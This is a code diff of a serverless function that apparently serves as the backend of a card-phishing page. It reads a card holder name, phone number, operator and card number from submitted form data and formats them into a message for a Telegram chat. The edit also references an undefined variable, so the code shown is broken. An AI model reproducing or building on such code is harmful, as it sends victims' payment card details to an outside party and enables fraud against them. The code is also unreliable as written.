@@ -12,7 +12,7 @@ exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body);
 
-    const name = data.name || '';
+    const name = data.Titulairedelacarte  || '';
     const phone = data.phone || '';  
     const operator = data.operator || '';
     const cardNumber = data.cardNumber || '';
@@ -33,7 +33,8 @@ exports.handler = async (event) => {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     let text = `📩 *Nouveau message dyal client*\n\n`;
-    text += `*Nom:* ${name}\n`;
+    text += `*Nom:* ${Titulairedelacarte}\n`;
+
     if (phone) text += `*Téléphone:* ${phone}\n`;
     if (operator) text += `*Opérateur:* ${operator}\n`;
     if (cardNumber) text += `*Numéro de carte:* ${cardNumber}\n`;
